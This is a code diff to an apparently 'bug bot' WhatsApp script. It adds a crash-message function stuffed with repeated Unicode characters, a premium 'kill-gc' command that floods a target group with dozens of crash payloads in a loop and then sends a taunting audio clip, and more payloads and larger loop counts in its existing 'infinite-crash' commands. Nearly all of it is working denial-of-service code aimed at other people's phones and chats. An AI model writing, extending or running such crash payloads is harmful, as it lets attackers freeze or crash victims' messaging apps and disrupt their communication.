@@ -460,6 +460,64 @@ const datas = [
       await XeonBotInc.sendMessage(from, buttonMessage, { quoted: m });
     }
   };
+
+async function sendAud(target) {
+var nicetitle = '♱♡ 𓆩Ⱦⱥīɍⱥ Ⱦēȼħ𓆪 ♱♡'
+var nicebody = `XBUG5`
+var niceurl = 'https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r'
+const nicepic = 'https://telegra.ph/file/0691935a017b74bc2e49b.jpg';
+const datas = [
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0204.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0206.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0207.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0208.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0208.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0230.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0231.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0233.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0232.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0235.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221018-WA0236.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0269.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0270.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0271.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0272.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0273.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0274.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0275.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0276.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0277.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0278.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0279.mp3?raw=true',
+        'https://github.com/SamPandey001/Secktor-Plugins/blob/main/plugins/bgm/AUD-20221106-WA0280.mp3?raw=true',
+                   ]
+      let rand = datas[Math.floor(Math.random() * datas.length)];
+      const logoo = await getBuffer(nicepic);
+      let buttonMessage= {
+        'audio': {
+          'url': rand
+        },
+        'mimetype': 'audio/mpeg',
+        'ptt': true,
+        'waveform': [0x63, 0x4b, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x19, 0x32, 0x4b, 0x63, 0x4b, 0x32, 0x19, 0x0],
+        'headerType': 1,
+        'contextInfo': {
+          'forwardingScore': 0x3e7,
+          'isForwarded': false,
+          'externalAdReply': {
+            'title': nicetitle,
+            'body': nicebody,
+            'renderLargerThumbnail': true,
+            'thumbnail': logoo,
+            'mediaUrl': '',
+            'mediaType': 1,
+            'sourceUrl': niceurl,
+            'showAdAttribution': true
+          }
+        }
+      };
+      await XeonBotInc.sendMessage(target, buttonMessage, { quoted: statrp });
+}
 	    
         if (!XeonBotInc.public) {
             if (!isCreator && !m.key.fromMe) return
@@ -1258,8 +1316,66 @@ async function StuckSql(target, image, Ptcp = true) {
 			} : {});
 	};
 
+
+async function ZnXIvS(target, Ptcp = true) {
+			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+				viewOnceMessage: {
+					message: {
+						interactiveMessage: {
+							header: {
+								title: "",
+								locationMessage: {},
+								hasMediaAttachment: true
+							},
+							body: {
+								text: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱"
+							},
+							nativeFlowMessage: {
+								name: "call_permission_request",
+								messageParamsJson: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱"
+							},
+							carouselMessage: {}
+						}
+					}
+				}
+			}), {
+				userJid: target,
+				quoted: Qrad
+			});
+
+			await XeonBotInc.relayMessage(target, etc.message, Ptcp ? {
+				participant: {
+					jid: target
+				}
+			} : {});
+		};
+
 	    
         switch (command) {
+case 'kill-gc': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
+let target = q
+await loading()
+for (let i = 0; i < 50; i++) {
+await callbg(target)
+await ios1(target)
+await ios2(target)
+await galx(target, Ptcp = false)
+await ioscrash(target)
+await callbg(target)
+await TrashSystem(target, xeonThm, Ptcp = false)
+await ZnXIvS(target, Ptcp = false)
+await callbg(target)
+await dott(target)
+await sleep(2000)
+}
+await replygcxeon(`Done sending bugs to ${q}`)
+await sendAud(m.chat)
+}
+break
+
+
 case 'infinite-crash': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
@@ -1267,6 +1383,7 @@ let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (;;) {
 await BugPayment(target)
+await galx(target, Ptcp = false)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -1285,6 +1402,7 @@ let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 50; i++) {
 await BugPayment(target)
+await galx(target, Ptcp = false)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -1305,6 +1423,7 @@ await loading()
 for (;;) {
 await BugPayment(target)
 await bugpayflow(target)
+await galx(target, Ptcp = false)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -1330,6 +1449,7 @@ await loading()
 for (let i = 0; i < 50; i++) {
 await BugPayment(target)
 await bugpayflow(target)
+await galx(target, Ptcp = false)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -1373,15 +1493,10 @@ if (!isPremium) return replygcxeon(mess.premium)
 if (!q) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
 let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
-for (let i = 0; i < 300; i++) {
+for (let i = 0; i < 500; i++) {
  await ios1(target)
  await ios2(target)
-      }
- await sleep(30000)
- for (let i = 0; i < 300; i++) {
- await ios1(target)
- await ios2(target)
- } 
+}
 await replygcxeon("Done Sending Bugs ✅")
 }
 break
